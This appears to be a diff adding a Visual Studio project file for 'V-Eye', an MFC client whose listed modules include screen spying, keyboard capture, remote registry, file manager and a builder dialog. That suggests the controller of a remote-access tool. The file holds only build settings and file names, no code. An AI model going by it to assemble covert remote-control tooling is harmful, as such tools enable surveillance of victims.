@@ -1,0 +1,293 @@
+<?xml version="1.0" encoding="gb2312"?>
+<VisualStudioProject ProjectType="Visual C++" Version="9.00" Name="Client" ProjectGUID="{5F6DBB31-6760-43EC-B59C-1FD1CC00AFDF}" RootNamespace="Client" Keyword="MFCProj" TargetFrameworkVersion="196613">
+  <Platforms>
+    <Platform Name="Win32" />
+  </Platforms>
+  <ToolFiles>
+  </ToolFiles>
+  <Configurations>
+    <Configuration Name="Debug|Win32" OutputDirectory="$(SolutionDir)$(ConfigurationName)" IntermediateDirectory="$(ConfigurationName)" ConfigurationType="1" UseOfMFC="1" CharacterSet="2">
+      <Tool Name="VCPreBuildEventTool" />
+      <Tool Name="VCCustomBuildTool" />
+      <Tool Name="VCXMLDataGeneratorTool" />
+      <Tool Name="VCWebServiceProxyGeneratorTool" />
+      <Tool Name="VCMIDLTool" PreprocessorDefinitions="_DEBUG" MkTypLibCompatible="false" ValidateParameters="false" />
+      <Tool Name="VCCLCompilerTool" AdditionalOptions="/Zm1000" Optimization="0" AdditionalIncludeDirectories="Include,..\Public" PreprocessorDefinitions="WIN32;_WINDOWS;_DEBUG" MinimalRebuild="true" BasicRuntimeChecks="3" RuntimeLibrary="1" TreatWChar_tAsBuiltInType="true" UsePrecompiledHeader="0" WarningLevel="3" Detect64BitPortabilityProblems="false" DebugInformationFormat="4" />
+      <Tool Name="VCManagedResourceCompilerTool" />
+      <Tool Name="VCResourceCompilerTool" PreprocessorDefinitions="_DEBUG" Culture="1033" AdditionalIncludeDirectories="$(IntDir)" />
+      <Tool Name="VCPreLinkEventTool" />
+      <Tool Name="VCLinkerTool" OutputFile="..\Bin\V-Eye.exe" LinkIncremental="1" UACExecutionLevel="2" UACUIAccess="false" IgnoreDefaultLibraryNames="libcd.lib;libcmt.lib" GenerateDebugInformation="true" SubSystem="2" TargetMachine="1" />
+      <Tool Name="VCALinkTool" />
+      <Tool Name="VCManifestTool" />
+      <Tool Name="VCXDCMakeTool" />
+      <Tool Name="VCBscMakeTool" />
+      <Tool Name="VCFxCopTool" />
+      <Tool Name="VCAppVerifierTool" />
+      <Tool Name="VCPostBuildEventTool" />
+    </Configuration>
+    <Configuration Name="Release|Win32" OutputDirectory="$(SolutionDir)$(ConfigurationName)" IntermediateDirectory="$(ConfigurationName)" ConfigurationType="1" UseOfMFC="1" CharacterSet="2" WholeProgramOptimization="0">
+      <Tool Name="VCPreBuildEventTool" />
+      <Tool Name="VCCustomBuildTool" />
+      <Tool Name="VCXMLDataGeneratorTool" />
+      <Tool Name="VCWebServiceProxyGeneratorTool" />
+      <Tool Name="VCMIDLTool" PreprocessorDefinitions="NDEBUG" MkTypLibCompatible="false" ValidateParameters="false" />
+      <Tool Name="VCCLCompilerTool" AdditionalOptions="/Zm1000" Optimization="2" EnableIntrinsicFunctions="false" AdditionalIncludeDirectories="Include,..\Public" PreprocessorDefinitions="WIN32;_WINDOWS;NDEBUG" StringPooling="false" MinimalRebuild="false" RuntimeLibrary="0" EnableFunctionLevelLinking="false" DisableLanguageExtensions="false" TreatWChar_tAsBuiltInType="true" ForceConformanceInForLoopScope="true" UsePrecompiledHeader="0" WarningLevel="3" DebugInformationFormat="3" />
+      <Tool Name="VCManagedResourceCompilerTool" />
+      <Tool Name="VCResourceCompilerTool" PreprocessorDefinitions="NDEBUG" Culture="1033" AdditionalIncludeDirectories="$(IntDir)" />
+      <Tool Name="VCPreLinkEventTool" />
+      <Tool Name="VCLinkerTool" OutputFile="..\Bin\V-Eye.exe" LinkIncremental="1" UACExecutionLevel="2" IgnoreDefaultLibraryNames="libc.lib;msvcrt.lib;libcd.lib;libcmtd.lib;msvcrtd.lib " GenerateDebugInformation="true" SubSystem="2" OptimizeReferences="2" EnableCOMDATFolding="2" TargetMachine="1" />
+      <Tool Name="VCALinkTool" />
+      <Tool Name="VCManifestTool" />
+      <Tool Name="VCXDCMakeTool" />
+      <Tool Name="VCBscMakeTool" />
+      <Tool Name="VCFxCopTool" />
+      <Tool Name="VCAppVerifierTool" />
+      <Tool Name="VCPostBuildEventTool" />
+    </Configuration>
+  </Configurations>
+  <References>
+  </References>
+  <Files>
+    <Filter Name="源文件" Filter="cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx" UniqueIdentifier="{4FC737F1-C7A5-4376-A066-2A32D752A2FF}">
+      <File RelativePath=".\Kami\AES.cpp">
+      </File>
+      <File RelativePath=".\Include\BmpToAvi.cpp">
+      </File>
+      <File RelativePath=".\Include\Buffer.cpp">
+      </File>
+      <File RelativePath=".\BuildDlg.cpp">
+      </File>
+      <File RelativePath=".\CardDlg.cpp">
+      </File>
+      <File RelativePath=".\Client.cpp">
+      </File>
+      <File RelativePath=".\ClientDoc.cpp">
+      </File>
+      <File RelativePath=".\ClientView.cpp">
+      </File>
+      <File RelativePath=".\ConTextDlg.cpp">
+      </File>
+      <File RelativePath=".\FileManagerDlg.cpp">
+      </File>
+      <File RelativePath=".\FileTransferModeDlg.cpp">
+      </File>
+      <File RelativePath=".\FreeYun.cpp">
+      </File>
+      <File RelativePath=".\GroupDlg.cpp">
+      </File>
+      <File RelativePath=".\InfoDlg.cpp">
+      </File>
+      <File RelativePath=".\Include\IniFile.cpp">
+      </File>
+      <File RelativePath=".\Include\InputDlg.cpp">
+      </File>
+      <File RelativePath=".\Include\IOCPServer.cpp">
+      </File>
+      <File RelativePath=".\KeyBoardDlg.cpp">
+      </File>
+      <File RelativePath=".\LoginDlg.cpp">
+      </File>
+      <File RelativePath=".\MainFrm.cpp">
+      </File>
+      <File RelativePath=".\MainWnd.cpp">
+      </File>
+      <File RelativePath=".\MsgBoxDlg.cpp">
+      </File>
+      <File RelativePath=".\MsgDlg.cpp">
+      </File>
+      <File RelativePath=".\PaneColorSet.cpp">
+      </File>
+      <File RelativePath=".\RegeditDlg.cpp">
+      </File>
+      <File RelativePath=".\RegeditTextDlg.cpp">
+      </File>
+      <File RelativePath=".\ScreenSpyDlg.cpp">
+      </File>
+      <File RelativePath=".\ServiceDlg.cpp">
+      </File>
+      <File RelativePath=".\ServiceInfoDlg.cpp">
+      </File>
+      <File RelativePath=".\stdafx.cpp">
+        <FileConfiguration Name="Debug|Win32">
+          <Tool Name="VCCLCompilerTool" UsePrecompiledHeader="1" />
+        </FileConfiguration>
+        <FileConfiguration Name="Release|Win32">
+          <Tool Name="VCCLCompilerTool" UsePrecompiledHeader="1" />
+        </FileConfiguration>
+      </File>
+      <File RelativePath=".\SystemDlg.cpp">
+      </File>
+      <File RelativePath=".\UrlDlg.cpp">
+      </File>
+      <File RelativePath=".\Kami\w3c.cpp">
+      </File>
+    </Filter>
+    <Filter Name="头文件" Filter="h;hpp;hxx;hm;inl;inc;xsd" UniqueIdentifier="{93995380-89BD-4b04-88EB-625FBE52EBFB}">
+      <File RelativePath=".\Kami\AES.h">
+      </File>
+      <File RelativePath=".\Include\BmpToAvi.h">
+      </File>
+      <File RelativePath=".\Include\Buffer.h">
+      </File>
+      <File RelativePath=".\BuildDlg.h">
+      </File>
+      <File RelativePath=".\CardDlg.h">
+      </File>
+      <File RelativePath=".\Client.h">
+      </File>
+      <File RelativePath=".\ClientDoc.h">
+      </File>
+      <File RelativePath=".\ClientView.h">
+      </File>
+      <File RelativePath=".\ConTextDlg.h">
+      </File>
+      <File RelativePath=".\Decode.h">
+      </File>
+      <File RelativePath=".\Encode.h">
+      </File>
+      <File RelativePath=".\FileManagerDlg.h">
+      </File>
+      <File RelativePath=".\FileTransferModeDlg.h">
+      </File>
+      <File RelativePath=".\FreeYun.h">
+      </File>
+      <File RelativePath=".\GroupDlg.h">
+      </File>
+      <File RelativePath=".\InfoDlg.h">
+      </File>
+      <File RelativePath=".\Include\IniFile.h">
+      </File>
+      <File RelativePath=".\Include\InputDlg.h">
+      </File>
+      <File RelativePath=".\Include\IOCPServer.h">
+      </File>
+      <File RelativePath=".\KeyBoardDlg.h">
+      </File>
+      <File RelativePath=".\LoginDlg.h">
+      </File>
+      <File RelativePath=".\MainFrm.h">
+      </File>
+      <File RelativePath=".\MainWnd.h">
+      </File>
+      <File RelativePath=".\Include\Mapper.h">
+      </File>
+      <File RelativePath=".\MsgBoxDlg.h">
+      </File>
+      <File RelativePath=".\MsgDlg.h">
+      </File>
+      <File RelativePath=".\PaneColorSet.h">
+      </File>
+      <File RelativePath="..\Public\Public.h">
+      </File>
+      <File RelativePath=".\RegeditDlg.h">
+      </File>
+      <File RelativePath=".\RegeditTextDlg.h">
+      </File>
+      <File RelativePath=".\Resource.h">
+      </File>
+      <File RelativePath=".\ScreenSpyDlg.h">
+      </File>
+      <File RelativePath=".\ServiceDlg.h">
+      </File>
+      <File RelativePath=".\ServiceInfoDlg.h">
+      </File>
+      <File RelativePath=".\stdafx.h">
+      </File>
+      <File RelativePath=".\SystemDlg.h">
+      </File>
+      <File RelativePath=".\UrlDlg.h">
+      </File>
+      <File RelativePath=".\Kami\w3c.h">
+      </File>
+    </Filter>
+    <Filter Name="资源文件" Filter="rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav" UniqueIdentifier="{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}">
+      <File RelativePath=".\res\1.cur">
+      </File>
+      <File RelativePath=".\res\2.cur">
+      </File>
+      <File RelativePath=".\res\Reg\201.ico">
+      </File>
+      <File RelativePath=".\res\Reg\202.ico">
+      </File>
+      <File RelativePath=".\res\Reg\203.ico">
+      </File>
+      <File RelativePath=".\res\Reg\204.ico">
+      </File>
+      <File RelativePath=".\res\Reg\205.ico">
+      </File>
+      <File RelativePath=".\res\Reg\206.ico">
+      </File>
+      <File RelativePath=".\res\工具栏\about.png">
+      </File>
+      <File RelativePath=".\res\Bitmap_1.bmp">
+      </File>
+      <File RelativePath=".\res\Bitmap_2.bmp">
+      </File>
+      <File RelativePath=".\res\build.png">
+      </File>
+      <File RelativePath=".\res\Client.ico">
+      </File>
+      <File RelativePath=".\Client.rc">
+      </File>
+      <File RelativePath=".\res\Client.rc2">
+      </File>
+      <File RelativePath=".\res\dot.cur">
+      </File>
+      <File RelativePath=".\res\File.ico">
+      </File>
+      <File RelativePath=".\res\kehu.bmp">
+      </File>
+      <File RelativePath=".\res\keyboard.ico">
+      </File>
+      <File RelativePath=".\res\login_bg.bmp">
+      </File>
+      <File RelativePath=".\res\工具栏\menu.bmp">
+      </File>
+      <File RelativePath=".\res\recv.bmp">
+      </File>
+      <File RelativePath=".\res\regedit.ico">
+      </File>
+      <File RelativePath=".\res\ScreenSpy.ico">
+      </File>
+      <File RelativePath=".\res\SearchToolBar.bmp">
+      </File>
+      <File RelativePath=".\res\send.bmp">
+      </File>
+      <File RelativePath=".\res\Service.ico">
+      </File>
+      <File RelativePath=".\res\工具栏\Splash.bmp">
+      </File>
+      <File RelativePath=".\res\System.ico">
+      </File>
+      <File RelativePath=".\res\TextChat.ico">
+      </File>
+      <File RelativePath=".\res\toolbar1.bmp">
+      </File>
+      <File RelativePath=".\res\toolbar2.bmp">
+      </File>
+      <File RelativePath=".\res\toolbar4.bmp">
+      </File>
+      <File RelativePath=".\res\tree_images.bmp">
+      </File>
+      <File RelativePath=".\res\关机.png">
+      </File>
+      <File RelativePath=".\res\发送消息.png">
+      </File>
+      <File RelativePath=".\res\工具栏\工具栏.png">
+      </File>
+      <File RelativePath=".\res\文件.png">
+      </File>
+      <File RelativePath=".\res\查看屏幕.png">
+      </File>
+      <File RelativePath=".\res\登录界面\登录.png">
+      </File>
+    </Filter>
+    <File RelativePath=".\ReadMe.txt">
+    </File>
+    <File RelativePath=".\res\VEye.zip">
+    </File>
+  </Files>
+  <Globals>
+    <Global Name="RESOURCE_FILE" Value="Client.rc" />
+  </Globals>
+</VisualStudioProject>
